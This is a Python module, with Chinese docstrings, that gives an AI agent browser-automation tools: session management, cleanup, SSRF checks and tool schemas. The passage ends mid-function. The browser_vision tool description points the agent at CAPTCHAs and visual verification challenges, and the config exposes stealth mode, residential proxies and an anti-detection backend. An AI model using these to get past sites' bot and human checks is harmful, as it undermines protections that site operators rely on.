#!/usr/bin/env python3
"""
浏览器工具模块

本模块使用 agent-browser CLI 提供浏览器自动化工具。支持
多个后端——**Browser Use**（云端，Nous 订阅者的默认选项）、
**Browserbase**（云端，直接凭据）和**本地
Chromium**——具有相同的代理面向行为。后端从
配置和可用凭据自动检测。

该工具使用 agent-browser 的可访问性树（ariaSnapshot）进行基于文本的
页面表示，非常适合没有视觉能力的 LLM 代理。

特性：
- **本地模式**（默认）：通过 agent-browser 实现零成本无头 Chromium。
  可在无显示器的 Linux 服务器上工作。一次设置：
  ``agent-browser install``（下载 Chromium）或
  ``agent-browser install --with-deps``（还为
  Debian/Ubuntu/Docker 安装系统库）。
- **云端模式**：配置时使用 Browserbase 或 Browser Use 云端执行。
- 每次任务 ID 的会话隔离
- 使用可访问性树的基于文本的页面快照
- 通过引用选择器（@e1、@e2 等）进行元素交互
- 使用 LLM 摘要进行任务感知内容提取
- 自动清理浏览器会话

环境变量：
- BROWSERBASE_API_KEY：直接 Browserbase 云模式的 API 密钥
- BROWSERBASE_PROJECT_ID：直接 Browserbase 云模式的项目 ID
- BROWSER_USE_API_KEY：直接 Browser Use 云模式的 API 密钥
- BROWSERBASE_PROXIES：启用/禁用住宅代理（默认："true"）
- BROWSERBASE_ADVANCED_STEALTH：使用自定义 Chromium 启用高级隐身模式，
  需要 Scale Plan（默认："false"）
- BROWSERBASE_KEEP_ALIVE：在断开连接后启用 keepAlive 以便会话重新连接，
  需要付费计划（默认："true"）
- BROWSERBASE_SESSION_TIMEOUT：自定义会话超时（毫秒）。设置以延长
  超出项目默认值。常用值：600000（10 分钟）、1800000（30 分钟）（默认：无）

用法：
    from tools.browser_tool import browser_navigate, browser_snapshot, browser_click

    # 导航到页面
    result = browser_navigate("https://example.com", task_id="task_123")

    # 获取页面快照
    snapshot = browser_snapshot(task_id="task_123")

    # 点击元素
    browser_click("@e5", task_id="task_123")
"""

import atexit
import json
import logging
import os
import re
import signal
import subprocess
import shutil
import sys
import tempfile
import threading
import time
import requests
from typing import Dict, Any, Optional, List
from pathlib import Path
from agent.auxiliary_client import call_llm
from kclaw_constants import get_kclaw_home

try:
    from tools.website_policy import check_website_access
except Exception:
    check_website_access = lambda url: None  # noqa: E731 — fail-open if policy module unavailable

try:
    from tools.url_safety import is_safe_url as _is_safe_url
except Exception:
    _is_safe_url = lambda url: False  # noqa: E731 — fail-closed: block all if safety module unavailable
from tools.browser_providers.base import CloudBrowserProvider
from tools.browser_providers.browserbase import BrowserbaseProvider
from tools.browser_providers.browser_use import BrowserUseProvider
from tools.browser_providers.firecrawl import FirecrawlProvider
from tools.tool_backend_helpers import normalize_browser_cloud_provider

# Camofox 本地反检测浏览器后端（可选）。
# 当设置 CAMOFOX_URL 时，所有浏览器操作通过
# camofox REST API 路由，而不是 agent-browser CLI。
try:
    from tools.browser_camofox import is_camofox_mode as _is_camofox_mode
except ImportError:
    _is_camofox_mode = lambda: False  # noqa: E731

logger = logging.getLogger(__name__)

# 标准 PATH 条目，用于 PATH 最少的环境（例如 systemd 服务）。
# 包括 macOS Homebrew 路径（Apple Silicon 的 /opt/homebrew/*）。
_SANE_PATH = (
    "/opt/homebrew/bin:/opt/homebrew/sbin:"
    "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
)


def _discover_homebrew_node_dirs() -> list[str]:
    """查找 Homebrew 版本化 Node.js bin 目录（例如 node@20、node@24）。

    当通过 ``brew install node@24`` 安装 Node 且未链接到
    /opt/homebrew/bin 时，二进制文件仅存在于 /opt/homebrew/opt/node@24/bin/。
    此函数发现这些路径，以便可以将它们添加到子进程 PATH。
    """
    dirs: list[str] = []
    homebrew_opt = "/opt/homebrew/opt"
    if not os.path.isdir(homebrew_opt):
        return dirs
    try:
        for entry in os.listdir(homebrew_opt):
            if entry.startswith("node") and entry != "node":
                # e.g. node@20, node@24
                bin_dir = os.path.join(homebrew_opt, entry, "bin")
                if os.path.isdir(bin_dir):
                    dirs.append(bin_dir)
    except OSError:
        pass
    return dirs

# 节流截图清理以避免重复的完整目录扫描。
_last_screenshot_cleanup_by_dir: dict[str, float] = {}

# ============================================================================
# 配置
# ============================================================================

# 浏览器命令的默认超时（秒）
DEFAULT_COMMAND_TIMEOUT = 30

# 默认会话超时（秒）
DEFAULT_SESSION_TIMEOUT = 300

# 摘要前快照内容的最大 token 数
SNAPSHOT_SUMMARIZE_THRESHOLD = 8000


def _get_command_timeout() -> int:
    """从 config.yaml 返回配置的浏览器命令超时。

    读取 ``config["browser"]["command_timeout"]`` 并回退到
    ``DEFAULT_COMMAND_TIMEOUT``（30s）（如果未设置或无法读取）。
    """
    try:
        from kclaw_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg.get("browser", {}).get("command_timeout")
        if val is not None:
            return max(int(val), 5)  # Floor at 5s to avoid instant kills
    except Exception as e:
        logger.debug("Could not read command_timeout from config: %s", e)
    return DEFAULT_COMMAND_TIMEOUT


def _get_vision_model() -> Optional[str]:
    """browser_vision 的模型（截图分析——多模态）。"""
    return os.getenv("AUXILIARY_VISION_MODEL", "").strip() or None


def _get_extraction_model() -> Optional[str]:
    """页面快照文本摘要的模型——与 web_extract 相同。"""
    return os.getenv("AUXILIARY_WEB_EXTRACT_MODEL", "").strip() or None


def _resolve_cdp_override(cdp_url: str) -> str:
    """将用户提供的 CDP 端点规范化为具体可连接的 URL。

    接受：
    - 完整 websocket 端点：ws://host:port/devtools/browser/...
    - HTTP 发现端点：http://host:port 或 http://host:port/json/version
    - 裸 websocket host:port 值如 ws://host:port

    对于发现式端点，我们获取 /json/version 并返回
    webSocketDebuggerUrl，以便下游工具始终收到具体的浏览器
    websocket 而不是模糊的 host:port URL。
    """
    raw = (cdp_url or "").strip()
    if not raw:
        return ""

    lowered = raw.lower()
    if "/devtools/browser/" in lowered:
        return raw

    discovery_url = raw
    if lowered.startswith(("ws://", "wss://")):
        if raw.count(":") == 2 and raw.rstrip("/").rsplit(":", 1)[-1].isdigit() and "/" not in raw.split(":", 2)[-1]:
            discovery_url = ("http://" if lowered.startswith("ws://") else "https://") + raw.split("://", 1)[1]
        else:
            return raw

    if discovery_url.lower().endswith("/json/version"):
        version_url = discovery_url
    else:
        version_url = discovery_url.rstrip("/") + "/json/version"

    try:
        response = requests.get(version_url, timeout=10)
        response.raise_for_status()
        payload = response.json()
    except Exception as exc:
        logger.warning("Failed to resolve CDP endpoint %s via %s: %s", raw, version_url, exc)
        return raw

    ws_url = str(payload.get("webSocketDebuggerUrl") or "").strip()
    if ws_url:
        logger.info("Resolved CDP endpoint %s -> %s", raw, ws_url)
        return ws_url

    logger.warning("CDP discovery at %s did not return webSocketDebuggerUrl; using raw endpoint", version_url)
    return raw


def _get_cdp_override() -> str:
    """返回规范化的用户提供的 CDP URL 覆盖，或空字符串。

    当设置了 ``BROWSER_CDP_URL``（例如通过 ``/browser connect``）时，
    我们跳过 Browserbase 和本地无头启动器，直接连接到
    提供的 Chrome DevTools Protocol 端点。
    """
    return _resolve_cdp_override(os.environ.get("BROWSER_CDP_URL", ""))


# ============================================================================
# 云提供商注册表
# ============================================================================

_PROVIDER_REGISTRY: Dict[str, type] = {
    "browserbase": BrowserbaseProvider,
    "browser-use": BrowserUseProvider,
    "firecrawl": FirecrawlProvider,
}

_cached_cloud_provider: Optional[CloudBrowserProvider] = None
_cloud_provider_resolved = False
_allow_private_urls_resolved = False
_cached_allow_private_urls: Optional[bool] = None


def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
    """返回配置的云浏览器提供商，本地模式则返回 None。

    读取 ``config["browser"]["cloud_provider"]`` 一次并缓存结果
    供进程生命周期使用。显式 ``local`` 提供商禁用云
    回退。如果未设置，在直接或托管
    Browserbase 凭据可用时回退到 Browserbase。
    """
    global _cached_cloud_provider, _cloud_provider_resolved
    if _cloud_provider_resolved:
        return _cached_cloud_provider

    _cloud_provider_resolved = True
    try:
        from kclaw_cli.config import read_raw_config
        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        provider_key = None
        if isinstance(browser_cfg, dict) and "cloud_provider" in browser_cfg:
            provider_key = normalize_browser_cloud_provider(
                browser_cfg.get("cloud_provider")
            )
            if provider_key == "local":
                _cached_cloud_provider = None
                return None
        if provider_key and provider_key in _PROVIDER_REGISTRY:
            _cached_cloud_provider = _PROVIDER_REGISTRY[provider_key]()
    except Exception as e:
        logger.debug("Could not read cloud_provider from config: %s", e)

    if _cached_cloud_provider is None:
        # Prefer Browser Use (managed Nous gateway or direct API key),
        # fall back to Browserbase (direct credentials only).
        fallback_provider = BrowserUseProvider()
        if fallback_provider.is_configured():
            _cached_cloud_provider = fallback_provider
        else:
            fallback_provider = BrowserbaseProvider()
            if fallback_provider.is_configured():
                _cached_cloud_provider = fallback_provider

    return _cached_cloud_provider


def _is_local_mode() -> bool:
    """当浏览器工具将使用本地浏览器后端时返回 True。"""
    if _get_cdp_override():
        return False
    return _get_cloud_provider() is None


def _is_local_backend() -> bool:
    """当浏览器在本地运行时返回 True（无云提供商）。

    SSRF 保护仅对云后端（Browserbase、BrowserUse）有意义，
    因为代理可以访问远程机器上的内部资源。对于本地后端——
    Camofox，或没有云提供商的内置无头
    Chromium——用户已经在同一台机器上拥有完整的终端
    和网络访问权限，因此该检查不会增加安全
    价值。
    """
    return _is_camofox_mode() or _get_cloud_provider() is None


def _allow_private_urls() -> bool:
    """返回浏览器是否被允许导航到私有/内部地址。

    读取 ``config["browser"]["allow_private_urls"]`` 一次并缓存结果
    供进程生命周期使用。默认为 ``False``（SSRF 保护活动）。
    """
    global _cached_allow_private_urls, _allow_private_urls_resolved
    if _allow_private_urls_resolved:
        return _cached_allow_private_urls

    _allow_private_urls_resolved = True
    _cached_allow_private_urls = False  # safe default
    try:
        from kclaw_cli.config import read_raw_config
        cfg = read_raw_config()
        _cached_allow_private_urls = bool(cfg.get("browser", {}).get("allow_private_urls"))
    except Exception as e:
        logger.debug("Could not read allow_private_urls from config: %s", e)
    return _cached_allow_private_urls


def _socket_safe_tmpdir() -> str:
    """返回一个适合 Unix 域套接字的短临时目录路径。

    macOS 将 ``TMPDIR`` 设置为 ``/var/folders/xx/.../T/``（约 51 个字符）。
    当我们附加 ``agent-browser-kclaw_…`` 时，
    生成的套接字路径超过 macOS ``AF_UNIX``
    地址的 104 字节限制，导致 agent-browser
    失败，出现"无法创建套接字目录"或静默截图失败。

    Linux ``tempfile.gettempdir()`` 已经返回 ``/tmp``，所以在那里是
    无操作。在 macOS 上，我们绕过 ``TMPDIR`` 直接使用 ``/tmp``
    （符号链接到 ``/private/tmp``，粘性位保护，始终可用）。
    """
    if sys.platform == "darwin":
        return "/tmp"
    return tempfile.gettempdir()


# 跟踪每个任务的活动会话
# 存储：session_name（始终）、bb_session_id + cdp_url（仅云模式）
_active_sessions: Dict[str, Dict[str, str]] = {}  # task_id -> {session_name, ...}
_recording_sessions: set = set()  # 带活动录制的 task_ids

# 跟踪清理是否完成的标志
_cleanup_done = False

# =============================================================================
#  inactivity 超时配置
# =============================================================================

# 会话 inactivity 超时（秒）——如果这么长时间没有活动则清理
# 默认：5 分钟。需要为 LLM 在浏览器命令之间留出推理空间，
# 特别是当子代理执行多步骤浏览器任务时。
BROWSER_SESSION_INACTIVITY_TIMEOUT = int(os.environ.get("BROWSER_INACTIVITY_TIMEOUT", "300"))

# 跟踪每个会话的最后活动时间
_session_last_activity: Dict[str, float] = {}

# 后台清理线程状态
_cleanup_thread = None
_cleanup_running = False
# 保护 _session_last_activity 和 _active_sessions 的线程安全
#（子代理通过 ThreadPoolExecutor 并发运行）
_cleanup_lock = threading.Lock()


def _emergency_cleanup_all_sessions():
    """
    所有活动浏览器会话的紧急清理。
    在进程退出或中断时调用以防止孤立会话。
    """
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True
    
    if not _active_sessions:
        return
    
    logger.info("Emergency cleanup: closing %s active session(s)...",
                len(_active_sessions))

    try:
        cleanup_all_browsers()
    except Exception as e:
        logger.error("Emergency cleanup error: %s", e)
    finally:
        with _cleanup_lock:
            _active_sessions.clear()
            _session_last_activity.clear()
        _recording_sessions.clear()


# 仅通过 atexit 注册清理。之前版本安装了 SIGINT/SIGTERM
# 处理程序调用 sys.exit()，但这与 prompt_toolkit 的
# 异步事件循环冲突——在密钥绑定回调中引发的 SystemExit
# 会破坏协程状态并使进程无法终止。atexit
# 处理程序在任何正常退出时运行（包括 sys.exit），
# 因此浏览器会话仍然会被清理而不劫持信号。
atexit.register(_emergency_cleanup_all_sessions)


# =============================================================================
# Inactivity 清理函数
# =============================================================================

def _cleanup_inactive_browser_sessions():
    """
    清理已处于非活动状态超过超时的浏览器会话。

    此函数由后台清理线程定期调用，以
    自动关闭最近未使用的会话，防止孤立会话
    （本地或 Browserbase）积累。
    """
    current_time = time.time()
    sessions_to_cleanup = []
    
    with _cleanup_lock:
        for task_id, last_time in list(_session_last_activity.items()):
            if current_time - last_time > BROWSER_SESSION_INACTIVITY_TIMEOUT:
                sessions_to_cleanup.append(task_id)
    
    for task_id in sessions_to_cleanup:
        try:
            elapsed = int(current_time - _session_last_activity.get(task_id, current_time))
            logger.info("Cleaning up inactive session for task: %s (inactive for %ss)", task_id, elapsed)
            cleanup_browser(task_id)
            with _cleanup_lock:
                if task_id in _session_last_activity:
                    del _session_last_activity[task_id]
        except Exception as e:
            logger.warning("Error cleaning up inactive session %s: %s", task_id, e)


def _browser_cleanup_thread_worker():
    """
    定期清理非活动浏览器会话的后台线程。

    每 30 秒运行一次，并检查在
    BROWSER_SESSION_INACTIVITY_TIMEOUT 期间内未使用的会话。
    """
    while _cleanup_running:
        try:
            _cleanup_inactive_browser_sessions()
        except Exception as e:
            logger.warning("Cleanup thread error: %s", e)
        
        # Sleep in 1-second intervals so we can stop quickly if needed
        for _ in range(30):
            if not _cleanup_running:
                break
            time.sleep(1)


def _start_browser_cleanup_thread():
    """如果后台清理线程尚未运行，则启动它。"""
    global _cleanup_thread, _cleanup_running
    
    with _cleanup_lock:
        if _cleanup_thread is None or not _cleanup_thread.is_alive():
            _cleanup_running = True
            _cleanup_thread = threading.Thread(
                target=_browser_cleanup_thread_worker,
                daemon=True,
                name="browser-cleanup"
            )
            _cleanup_thread.start()
            logger.info("Started inactivity cleanup thread (timeout: %ss)", BROWSER_SESSION_INACTIVITY_TIMEOUT)


def _stop_browser_cleanup_thread():
    """停止后台清理线程。"""
    global _cleanup_running
    _cleanup_running = False
    if _cleanup_thread is not None:
        _cleanup_thread.join(timeout=5)


def _update_session_activity(task_id: str):
    """更新会话的最后活动时间戳。"""
    with _cleanup_lock:
        _session_last_activity[task_id] = time.time()


# 在退出时注册清理线程停止
atexit.register(_stop_browser_cleanup_thread)


# ============================================================================
# 工具 Schema
# ============================================================================

BROWSER_TOOL_SCHEMAS = [
    {
        "name": "browser_navigate",
        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "The URL to navigate to (e.g., 'https://example.com')"
                }
            },
            "required": ["url"]
        }
    },
    {
        "name": "browser_snapshot",
        "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 8000 chars are truncated or LLM-summarized. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot — use this to refresh after interactions that change the page, or with full=true for complete content.",
        "parameters": {
            "type": "object",
            "properties": {
                "full": {
                    "type": "boolean",
                    "description": "If true, returns complete page content. If false (default), returns compact view with interactive elements only.",
                    "default": False
                }
            },
            "required": []
        }
    },
    {
        "name": "browser_click",
        "description": "Click on an element identified by its ref ID from the snapshot (e.g., '@e5'). The ref IDs are shown in square brackets in the snapshot output. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"
                }
            },
            "required": ["ref"]
        }
    },
    {
        "name": "browser_type",
        "description": "Type text into an input field identified by its ref ID. Clears the field first, then types the new text. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e3')"
                },
                "text": {
                    "type": "string",
                    "description": "The text to type into the field"
                }
            },
            "required": ["ref", "text"]
        }
    },
    {
        "name": "browser_scroll",
        "description": "Scroll the page in a direction. Use this to reveal more content that may be below or above the current viewport. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "direction": {
                    "type": "string",
                    "enum": ["up", "down"],
                    "description": "Direction to scroll"
                }
            },
            "required": ["direction"]
        }
    },
    {
        "name": "browser_back",
        "description": "Navigate back to the previous page in browser history. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_press",
        "description": "Press a keyboard key. Useful for submitting forms (Enter), navigating (Tab), or keyboard shortcuts. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "key": {
                    "type": "string",
                    "description": "Key to press (e.g., 'Enter', 'Tab', 'Escape', 'ArrowDown')"
                }
            },
            "required": ["key"]
        }
    },
    {
        "name": "browser_close",
        "description": "Close the browser session and release resources. Call this when done with browser tasks to free up cloud browser session quota.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_get_images",
        "description": "Get a list of all images on the current page with their URLs and alt text. Useful for finding images to analyze with the vision tool. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_vision",
        "description": "Take a screenshot of the current page and analyze it with vision AI. Use this when you need to visually understand what's on the page - especially useful for CAPTCHAs, visual verification challenges, complex layouts, or when the text snapshot doesn't capture important visual information. Returns both the AI analysis and a screenshot_path that you can share with the user by including MEDIA:<screenshot_path> in your response. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "question": {
                    "type": "string",
                    "description": "What you want to know about the page visually. Be specific about what you're looking for."
                },
                "annotate": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, overlay numbered [N] labels on interactive elements. Each [N] maps to ref @eN for subsequent browser commands. Useful for QA and spatial reasoning about page layout."
                }
            },
            "required": ["question"]
        }
    },
    {
        "name": "browser_console",
        "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first. When 'expression' is provided, evaluates JavaScript in the page context and returns the result — use this for DOM inspection, reading page state, or extracting data programmatically.",
        "parameters": {
            "type": "object",
            "properties": {
                "clear": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, clear the message buffers after reading"
                },
                "expression": {
                    "type": "string",
                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'"
                }
            },
            "required": []
        }
    },
]


# ============================================================================
# 工具函数
# ============================================================================

def _create_local_session(task_id: str) -> Dict[str, str]:
    import uuid
    session_name = f"h_{uuid.uuid4().hex[:10]}"
    logger.info("Created local browser session %s for task %s",
                session_name, task_id)
    return {
        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": None,
        "features": {"local": True},
    }


def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
    """Create a session that connects to a user-supplied CDP endpoint."""
    import uuid
    session_name = f"cdp_{uuid.uuid4().hex[:10]}"
    logger.info("Created CDP browser session %s → %s for task %s",
                session_name, cdp_url, task_id)
    return {
        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": cdp_url,
        "features": {"cdp_override": True},
    }


def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
    """
    获取或创建给定任务的会话信息。

    在云模式下，创建启用代理的 Browserbase 会话。
    在本地模式下，为 agent-browser --session 生成会话名称。
    还启动 inactivity 清理线程并更新活动跟踪。
    线程安全：多个子代理可以并发调用此函数。

    参数：
        task_id: 任务的唯一标识符

    返回：
        带 session_name（始终）的字典，bb_session_id + cdp_url（仅云）
    """
    if task_id is None:
        task_id = "default"

    # 如果清理线程未运行则启动它（处理 inactivity 超时）
    _start_browser_cleanup_thread()

    # 更新此会话的活动时间戳
    _update_session_activity(task_id)

    with _cleanup_lock:
        # 检查我们是否已为此任务设置了会话
        if task_id in _active_sessions:
            return _active_sessions[task_id]

    # 在锁外创建会话（云模式下的网络调用）
    cdp_override = _get_cdp_override()
    if cdp_override:
        session_info = _create_cdp_session(task_id, cdp_override)
    else:
        provider = _get_cloud_provider()
        if provider is None:
            session_info = _create_local_session(task_id)
        else:
            session_info = provider.create_session(task_id)
            if session_info.get("cdp_url"):
                # 一些云提供商（包括 Browser-Use v3）返回 HTTP
                # CDP 发现 URL 而不是原始 websocket 端点。
                session_info = dict(session_info)
                session_info["cdp_url"] = _resolve_cdp_override(str(session_info["cdp_url"]))

    with _cleanup_lock:
        # 双重检查：当我们进行网络调用时，另一线程可能已创建了会话。
        # 使用现有的以避免泄漏孤立的云会话。
        if task_id in _active_sessions:
            return _active_sessions[task_id]
        _active_sessions[task_id] = session_info

    return session_info



def _find_agent_browser() -> str:
    """
    查找 agent-browser CLI 可执行文件。

    按顺序检查：当前 PATH、Homebrew/常见 bin 目录、KClaw 管理的
    node、local node_modules/.bin/、npx 后备。

    返回：
        agent-browser 可执行文件的路径

    抛出：
        FileNotFoundError：如果 agent-browser 未安装
    """

    # 检查它是否在 PATH 中（全局安装）
    which_result = shutil.which("agent-browser")
    if which_result:
        return which_result

    # 构建包含 Homebrew 和 KClaw 管理目录的扩展搜索 PATH。
    # 这覆盖了进程 PATH 可能不包含 Homebrew 路径的 macOS。
    extra_dirs: list[str] = []
    for d in ["/opt/homebrew/bin", "/usr/local/bin"]:
        if os.path.isdir(d):
            extra_dirs.append(d)
    extra_dirs.extend(_discover_homebrew_node_dirs())

    kclaw_home = get_kclaw_home()
    kclaw_node_bin = str(kclaw_home / "node" / "bin")
    if os.path.isdir(kclaw_node_bin):
        extra_dirs.append(kclaw_node_bin)

    if extra_dirs:
        extended_path = os.pathsep.join(extra_dirs)
        which_result = shutil.which("agent-browser", path=extended_path)
        if which_result:
            return which_result

    # 检查本地 node_modules/.bin/（在仓库根目录的 npm install）
    repo_root = Path(__file__).parent.parent
    local_bin = repo_root / "node_modules" / ".bin" / "agent-browser"
    if local_bin.exists():
        return str(local_bin)
    
    # Check common npx locations (also search extended dirs)
    npx_path = shutil.which("npx")
    if not npx_path and extra_dirs:
        npx_path = shutil.which("npx", path=os.pathsep.join(extra_dirs))
    if npx_path:
        return "npx agent-browser"
    
    raise FileNotFoundError(
        "agent-browser CLI not found. Install it with: npm install -g agent-browser\n"
        "Or run 'npm install' in the repo root to install locally.\n"
        "Or ensure npx is available in your PATH."
    )


def _extract_screenshot_path_from_text(text: str) -> Optional[str]:
    """从 agent-browser 人类可读的输出中提取截图文件路径。"""
    if not text:
        return None

    patterns = [
        r"Screenshot saved to ['\"](?P<path>/[^'\"]+?\.png)['\"]",
        r"Screenshot saved to (?P<path>/\S+?\.png)(?:\s|$)",
        r"(?P<path>/\S+?\.png)(?:\s|$)",
    ]

    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            path = match.group("path").strip().strip("'\"")
            if path:
                return path

    return None


def _run_browser_command(
    task_id: str,
    command: str,
    args: List[str] = None,
    timeout: Optional[int] = None,
) -> Dict[str, Any]:
    """
    使用我们预先创建的 Browserbase 会话运行 agent-browser CLI 命令。

    参数：
        task_id: 任务标识符以获取正确的会话
        command: 要运行的命令（例如，"open"、"click"）
        args: 命令的附加参数
        timeout: 命令超时（秒）。``None`` 读取
                 配置中的 ``browser.command_timeout``（默认 30s）。

    返回：
        来自 agent-browser 的解析 JSON 响应
    """
    if timeout is None:
        timeout = _get_command_timeout()
    args = args or []
    
    # Build the command
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        logger.warning("agent-browser CLI not found: %s", e)
        return {"success": False, "error": str(e)}
    
    from tools.interrupt import is_interrupted
    if is_interrupted():
        return {"success": False, "error": "Interrupted"}

    # Get session info (creates Browserbase session with proxies if needed)
    try:
        session_info = _get_session_info(task_id)
    except Exception as e:
        logger.warning("Failed to create browser session for task=%s: %s", task_id, e)
        return {"success": False, "error": f"Failed to create browser session: {str(e)}"}
    
    # 使用适当的后端标志构建命令。
    # 云模式：--cdp <websocket_url> 连接到 Browserbase。
    # 本地模式：--session <name> 启动本地无头 Chromium。
    # 命令的其余部分（--json、command、args）是相同的。
    if session_info.get("cdp_url"):
        # Cloud mode — connect to remote Browserbase browser via CDP
        # IMPORTANT: Do NOT use --session with --cdp. In agent-browser >=0.13,
        # --session creates a local browser instance and silently ignores --cdp.
        backend_args = ["--cdp", session_info["cdp_url"]]
    else:
        # Local mode — launch a headless Chromium instance
        backend_args = ["--session", session_info["session_name"]]

    # Keep concrete executable paths intact, even when they contain spaces.
    # Only the synthetic npx fallback needs to expand into multiple argv items.
    cmd_prefix = ["npx", "agent-browser"] if browser_cmd == "npx agent-browser" else [browser_cmd]

    cmd_parts = cmd_prefix + backend_args + [
        "--json",
        command
    ] + args
    
    try:
        # 给每个任务自己的套接字目录以防止并发冲突。
        # 没有这个，并行工作进程会争夺相同的默认套接字路径，
        # 导致"无法创建套接字目录：权限被拒绝"错误。
        task_socket_dir = os.path.join(
            _socket_safe_tmpdir(),
            f"agent-browser-{session_info['session_name']}"
        )
        os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
        logger.debug("browser cmd=%s task=%s socket_dir=%s (%d chars)",
                     command, task_id, task_socket_dir, len(task_socket_dir))
        
        browser_env = {**os.environ}

        # Ensure PATH includes KClaw-managed Node first, Homebrew versioned
        # node dirs (for macOS ``brew install node@24``), then standard system dirs.
        kclaw_home = get_kclaw_home()
        kclaw_node_bin = str(kclaw_home / "node" / "bin")

        existing_path = browser_env.get("PATH", "")
        path_parts = [p for p in existing_path.split(":") if p]
        candidate_dirs = (
            [kclaw_node_bin]
            + _discover_homebrew_node_dirs()
            + [p for p in _SANE_PATH.split(":") if p]
        )

        for part in reversed(candidate_dirs):
            if os.path.isdir(part) and part not in path_parts:
                path_parts.insert(0, part)

        browser_env["PATH"] = ":".join(path_parts)
        browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir
        
        # 使用临时文件代替管道处理 stdout/stderr。
        # agent-browser 启动一个继承文件描述符的后台守护进程。
        # 使用 capture_output=True（管道），守护进程在 CLI 退出后保持
        # 管道 fd 打开，因此 communicate() 永远看不到 EOF，
        # 并阻塞直到超时触发。
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{command}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{command}")
        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            proc = subprocess.Popen(
                cmd_parts,
                stdout=stdout_fd,
                stderr=stderr_fd,
                stdin=subprocess.DEVNULL,
                env=browser_env,
            )
        finally:
            os.close(stdout_fd)
            os.close(stderr_fd)

        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            logger.warning("browser '%s' timed out after %ds (task=%s, socket_dir=%s)",
                           command, timeout, task_id, task_socket_dir)
            return {"success": False, "error": f"Command timed out after {timeout} seconds"}

        with open(stdout_path, "r") as f:
            stdout = f.read()
        with open(stderr_path, "r") as f:
            stderr = f.read()
        returncode = proc.returncode

        # Clean up temp files (best-effort)
        for p in (stdout_path, stderr_path):
            try:
                os.unlink(p)
            except OSError:
                pass

        # 记录 stderr 用于诊断——在失败时使用警告级别以便可见
        if stderr and stderr.strip():
            level = logging.WARNING if returncode != 0 else logging.DEBUG
            logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])

        # 将空输出记录为警告——agent-browser 损坏的常见迹象
        if not stdout.strip() and returncode == 0:
            logger.warning("browser '%s' returned empty stdout with rc=0. "
                           "cmd=%s stderr=%s",
                           command, " ".join(cmd_parts[:4]) + "...",
                           (stderr or "")[:200])

        stdout_text = stdout.strip()

        if stdout_text:
            try:
                parsed = json.loads(stdout_text)
                # 如果快照返回为空则发出警告（守护进程/CDP 问题的常见迹象）
                if command == "snapshot" and parsed.get("success"):
                    snap_data = parsed.get("data", {})
                    if not snap_data.get("snapshot") and not snap_data.get("refs"):
                        logger.warning("snapshot returned empty content. "
                                       "Possible stale daemon or CDP connection issue. "
                                       "returncode=%s", returncode)
                return parsed
            except json.JSONDecodeError:
                raw = stdout_text[:2000]
                logger.warning("browser '%s' returned non-JSON output (rc=%s): %s",
                               command, returncode, raw[:500])

                if command == "screenshot":
                    stderr_text = (stderr or "").strip()
                    combined_text = "\n".join(
                        part for part in [stdout_text, stderr_text] if part
                    )
                    recovered_path = _extract_screenshot_path_from_text(combined_text)

                    if recovered_path and Path(recovered_path).exists():
                        logger.info(
                            "browser 'screenshot' recovered file from non-JSON output: %s",
                            recovered_path,
                        )
                        return {
                            "success": True,
                            "data": {
                                "path": recovered_path,
                                "raw": raw,
                            },
                        }

                return {
                    "success": False,
                    "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
                }
        
        # Check for errors
        if returncode != 0:
